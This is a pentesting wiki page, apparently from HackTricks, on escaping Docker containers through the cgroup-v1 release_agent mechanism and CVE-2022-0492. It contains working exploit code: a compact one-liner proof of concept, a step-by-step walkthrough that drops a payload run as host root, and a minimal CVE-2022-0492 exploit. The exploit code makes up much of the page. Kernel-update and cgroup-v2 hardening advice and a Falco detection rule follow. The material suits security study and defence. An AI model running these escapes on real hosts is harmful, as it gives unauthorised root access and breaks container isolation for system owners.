# Docker release_agent cgroups escape

{{#include ../../../../banners/hacktricks-training.md}}

**For further details, refer to the** [**original blog post**](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)**.** This is just a summary:

---

## Classic PoC (2019)

```shell
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
touch /o; echo $t/c >$d/release_agent;echo "#!/bin/sh
$1 >$t/o" >/c;chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
```

The PoC abuses the **cgroup-v1** `release_agent` feature: when the last task of a cgroup that has `notify_on_release=1` exits, the kernel (in the **initial namespaces on the host**) executes the program whose pathname is stored in the writable file `release_agent`.  Because that execution happens with **full root privileges on the host**, gaining write access to the file is enough for a container escape.

### Short, readable walk-through

1. **Prepare a new cgroup**

   ```shell
   mkdir /tmp/cgrp
   mount -t cgroup -o rdma cgroup /tmp/cgrp   # or –o memory
   mkdir /tmp/cgrp/x
   echo 1 > /tmp/cgrp/x/notify_on_release
   ```

2. **Point `release_agent` to attacker-controlled script on the host**

   ```shell
   host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
   echo "$host_path/cmd" > /tmp/cgrp/release_agent
   ```

3. **Drop the payload**

   ```shell
   cat <<'EOF' > /cmd
#!/bin/sh
ps aux > "$host_path/output"
EOF
   chmod +x /cmd
   ```

4. **Trigger the notifier**

   ```shell
   sh -c "echo $$ > /tmp/cgrp/x/cgroup.procs"   # add ourselves and immediately exit
   cat /output                                  # now contains host processes
   ```

---

## 2022 kernel vulnerability – CVE-2022-0492

In February 2022 Yiqi Sun and Kevin Wang discovered that **the kernel did *not* verify capabilities when a process wrote to `release_agent` in cgroup-v1** (function `cgroup_release_agent_write`).

Effectively **any process that could mount a cgroup hierarchy (e.g. via `unshare -UrC`) could write an arbitrary path to `release_agent` without `CAP_SYS_ADMIN` in the *initial* user namespace**.  On a default-configured, root-running Docker/Kubernetes container this allowed:

* privilege escalation to root on the host; ↗
* container escape without the container being privileged.

The flaw was assigned **CVE-2022-0492** (CVSS 7.8 / High) and fixed in the following kernel releases (and all later):

* 5.16.2, 5.15.17, 5.10.93, 5.4.176, 4.19.228, 4.14.265, 4.9.299.

Patch commit: `1e85af15da28 "cgroup: Fix permission checking"`.

### Minimal exploit inside a container

```bash
# prerequisites: container is run as root, no seccomp/AppArmor profile, cgroup-v1 rw inside
apk add --no-cache util-linux  # provides unshare
unshare -UrCm sh -c '
  mkdir /tmp/c; mount -t cgroup -o memory none /tmp/c;
  echo 1 > /tmp/c/notify_on_release;
  echo /proc/self/exe > /tmp/c/release_agent;     # will exec /bin/busybox from host
  (sleep 1; echo 0 > /tmp/c/cgroup.procs) &
  while true; do sleep 1; done
'
```
If the kernel is vulnerable the busybox binary from the *host* executes with full root.

### Hardening & Mitigations

* **Update the kernel** (≥ versions above).  The patch now requires `CAP_SYS_ADMIN` in the *initial* user namespace to write to `release_agent`.
* **Prefer cgroup-v2** – the unified hierarchy **removed the `release_agent` feature completely**, eliminating this class of escapes.
* **Disable unprivileged user namespaces** on hosts that do not need them:
  ```shell
  sysctl -w kernel.unprivileged_userns_clone=0
  ```
* **Mandatory access control**: AppArmor/SELinux policies that deny `mount`, `openat` on `/sys/fs/cgroup/**/release_agent`, or drop `CAP_SYS_ADMIN`, stop the technique even on vulnerable kernels.
* **Read-only bind-mask** all `release_agent` files (Palo Alto script example):
  ```shell
  for f in $(find /sys/fs/cgroup -name release_agent); do
      mount --bind -o ro /dev/null "$f"
  done
  ```

## Detection at runtime

[`Falco`](https://falco.org/) ships a built-in rule since v0.32:

```yaml
- rule: Detect release_agent File Container Escapes
  desc: Detect an attempt to exploit a container escape using release_agent
  condition: open_write and container and fd.name endswith release_agent and
             (user.uid=0 or thread.cap_effective contains CAP_DAC_OVERRIDE) and
             thread.cap_effective contains CAP_SYS_ADMIN
  output: "Potential release_agent container escape (file=%fd.name user=%user.name cap=%thread.cap_effective)"
  priority: CRITICAL
  tags: [container, privilege_escalation]
```

The rule triggers on any write attempt to `*/release_agent` from a process inside a container that still wields `CAP_SYS_ADMIN`.


## References

* [Unit 42 – CVE-2022-0492: container escape via cgroups](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/) – detailed analysis and mitigation script.
* [Sysdig Falco rule & detection guide](https://sysdig.com/blog/detecting-mitigating-cve-2022-0492-sysdig/)

{{#include ../../../../banners/hacktricks-training.md}}